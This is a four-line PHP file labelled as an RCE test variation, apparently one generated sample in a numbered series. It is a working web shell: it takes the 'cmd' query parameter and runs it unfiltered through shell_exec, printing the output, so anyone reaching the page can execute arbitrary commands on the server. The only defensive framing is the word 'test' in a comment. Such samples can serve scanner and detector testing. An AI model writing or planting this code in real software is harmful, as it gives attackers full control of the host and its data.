<?php
// RCE test variation #1350
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>